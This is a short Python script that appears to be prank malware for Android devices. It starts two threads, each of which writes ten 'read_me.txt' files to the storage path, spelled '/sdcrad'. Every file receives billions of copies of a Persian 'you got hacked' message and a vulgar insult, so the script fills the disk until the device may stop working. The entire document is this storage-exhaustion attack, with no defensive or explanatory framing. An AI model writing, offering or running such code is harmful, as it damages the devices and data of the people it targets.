import os
import threading
def txt():
    try:
        os.chdir('/sdcrad')
    except:
        pass
    for u in range(10):
        a = open(str(u) + "read_me.txt", 'a')
        for i in range(50000):
            a.write("\nhack shodi\nhack kos nanat"*5000)

def txt2():
    try:
        os.chdir('/sdcrad')
    except:
        pass
    for u in range(10):
        a = open(str(u) + "read_me.txt", 'a')
        for i in range(50000):
            a.write("\nhack shodi\nhack kos nanat" * 5000)

threading.Thread(target=txt).start()
threading.Thread(target=txt2).start()
